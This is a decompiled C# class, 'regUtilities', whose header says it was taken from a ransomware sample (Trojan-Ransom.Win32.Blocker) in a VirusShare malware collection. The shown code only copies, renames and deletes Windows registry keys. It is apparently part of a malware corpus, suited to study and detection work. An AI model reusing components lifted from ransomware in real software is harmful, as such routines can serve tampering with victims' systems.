// Decompiled with JetBrains decompiler
// Type: Handyware.regUtilities
// Assembly: Handyware, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79A15AC7-DE29-40AC-9E7A-1719C725BB8B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.dizu-68e906811b2a0a3f0f264be4966fee8440ac83cc6a06bae2c47bdbf43e5284bc.exe

using Microsoft.Win32;

namespace Handyware
{
  public class regUtilities
  {
    public bool RenameSubKey(RegistryKey parentKey, string subKeyName, string newSubKeyName)
    {
      this.CopyKey(parentKey, subKeyName, newSubKeyName);
      parentKey.DeleteSubKeyTree(subKeyName);
      return true;
    }

    public bool CopyKey(RegistryKey parentKey, string keyNameToCopy, string newKeyName)
    {
      RegistryKey subKey = parentKey.CreateSubKey(newKeyName);
      this.RecurseCopyKey(parentKey.OpenSubKey(keyNameToCopy), subKey);
      return true;
    }

    private void RecurseCopyKey(RegistryKey sourceKey, RegistryKey destinationKey)
    {
      foreach (string valueName in sourceKey.GetValueNames())
      {
        object obj = sourceKey.GetValue(valueName);
        RegistryValueKind valueKind = sourceKey.GetValueKind(valueName);
        destinationKey.SetValue(valueName, obj, valueKind);
      }
      foreach (string subKeyName in sourceKey.GetSubKeyNames())
        this.RecurseCopyKey(sourceKey.OpenSubKey(subKeyName), destinationKey.CreateSubKey(subKeyName));
    }
  }
}
